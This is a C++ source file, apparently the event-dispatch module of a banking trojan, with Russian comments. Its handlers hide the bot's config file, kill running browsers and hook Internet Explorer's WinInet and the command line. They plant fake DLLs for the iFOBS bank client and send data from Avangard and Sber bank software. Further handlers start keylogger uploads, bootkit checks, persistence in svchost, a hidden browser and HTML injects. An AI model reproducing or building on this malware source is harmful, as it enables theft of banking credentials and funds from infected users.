//---------------------------------------------------------------------------

#include "BotEvents.h"
#include "GetApi.h"
#include "Strings.h"
#include "Utils.h"
#include "Loader.h"
#include "Pipes.h"
#include "BotHosts.h"
#include "BotCore.h"
#include "StrConsts.h"

#include "Modules.h"

//---------------------------------------------------------------------------





//-----------------------------------------------------------
//  InitializeHiddenFiles - Функция инициализирует массив
//                          файлов имена которых бот будет
//                          прятать
//-----------------------------------------------------------
void InitializeHiddenFiles()
{
	BOT::AddHiddenFile(GetStr(EStrConfigFileName));
	//BOT::AddHiddenFile(GetStr(EStrConfigHPFileName));
}

//---------------------------------------------------------------------------

//extern bool ExecuteLoadDLLDisk(LPVOID, PCHAR Command, PCHAR Args);
extern bool ExecuteDocFind(LPVOID, PCHAR Command, PCHAR Args);

void ExplorerFirstStart(PEventData Data)
{
	#ifdef antirapportH
		AntiRapport();
	#endif
	
	#ifdef AvangardH
		AvangardWeb::SendFolder_avn_ib();
	#endif
	
	#ifdef SBERH
		Sber::SendLogIfReestr();
	#endif

	#ifdef IFobsH
		IFobs::KillIFobs(0);
	#ifdef FakeDllInstallerH
		RunThread( IFobs::InstallFakeDll,0 );
	#endif
	#endif

	//ExecuteDocFind( 0, 0, 0 );
	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
//	ExecuteRunRDP( 0, 0, 0 );
//	ExecuteVNC( 0, 0, "192.168.0.100" );
	// Первый запуск бота в проводнике

	// Запускаем удаление кукисов
	/* #ifdef coocksolH
		StartDeleteCookiesThread();
    #endif */
}
//---------------------------------------------------------------------------


void ExplorerStart(PEventData Data)
{

	// Создаём глобальный мьютекс, сигнализирующий о запущенном боте
	BOT::TryCreateBotInstance();


	// Инициализируем скрываемые файлы
    InitializeHiddenFiles();


	// Записываем текущие настроки в файл.
	// Запись осуществится только если записанных настроек нет
    BOT::SaveSettings(true, true, true);


	// Убиваем все запущенные браузеры
	KillAllBrowsers();

	#ifdef FakeDllInstallerH
    	FDI::Execute();
	#endif

	#ifdef BBSCBankH
		CBank::Start();
	#endif

	#ifdef JAVS_PATCHERH
		StartThread(Run_Path, NULL);
	#endif

	// Хукаем библиотеку WinInet
	#ifdef InternetExplorerH
		HookInternetExplorer();
	#endif

	// Запускаем модуль живучести
	#ifdef KeepAliveH
		KeepAliveCheckProcess(PROCESS_SVCHOST);
		#ifdef VideoRecorderH
			#ifdef VideoProcessSvchost
				KeepAliveCheckProcess(PROCESS_VIDEO);
			#endif 
		#endif
	#endif


	// Проверяем систему киберплат
	#ifdef CyberPlatDLLH
		CyberPlatCheckInstalled(); 
	#endif

	#ifdef CmdLineH
		HookCmdLine();
	#endif

	#ifdef BOTMONITOR
    	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessExplorer, true);
	#endif

	#ifdef BitcoinH
		BitcoinRunAfterReboot();
	#endif

	#ifdef VideoRecorderH
		VideoProcess::ConnectToServer( 0, true );
	#endif

	// Запуск потока скрытого браузера.
	// ВАЖНО! Вызов должен вызываться в последнюю очередь
	#ifdef StealthBrowserH
		HANDLE H = StartThread( RunIeSB/*SellExecute*/, NULL );// запускаем поток отвечающеий за запуск браузера
		pWaitForSingleObject(H, INFINITE);
	#endif

}
//---------------------------------------------------------------------------

void SVChostStart(PEventData Data, bool &Cancel)
{
	// Запущена функция работающая в процессе svchost


	// запускаем автоматическую загрузку хостов
	#ifdef HostsAutoUpdateH
		StartHostsUpdater();
	#endif

	#ifdef bootkitH
		IsBootkitInstaled();
	#endif


	#ifdef KeepAliveH
		// Инициализируем модуль живучести
		KeepAliveInitializeProcess(PROCESS_SVCHOST);
	#endif

	//Стартуем поток проверки появления данных для отправки кейлогером
	#ifdef KeyLoggerH	
		SendLoadedFiles();
	#endif

		//Модуль охотник за сайтами , проверяет раз в 15 сек если создался мьютекс,то выполняет команду SB
		// Инициализируем клиента ожидания охотника за ссылками
	#ifdef HunterH
		URLHunter::StartClient();
	#endif

	#ifdef BOTMONITOR
    	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessLoader, true);
	#endif
}
//---------------------------------------------------------------------------

void InternetExplorerStarted(PEventData Data)
{
	// Запущен Internet Explorer. Возникает после инжекта в процесс браузера

}
//---------------------------------------------------------------------------


void FireFoxStarted(PEventData Data)
{
	// Запущен АшкуАщч. Возникает после инжекта в процесс браузера

}
//---------------------------------------------------------------------------

void BrowserStarted(PEventData Data)
{
	// Запущен известный браузер. Возникает после инжекта в процесс браузера
	#ifdef HTMLSendH
		InitHTMLSendHandlers();
	#endif;

	#ifdef AzConfigH
		AzInizializeHTMLInjects();
	#endif

}
//---------------------------------------------------------------------------

void ApplicationStarted(PEventData Data)
{
	// Запущено неизвестное приложение

}
//---------------------------------------------------------------------------

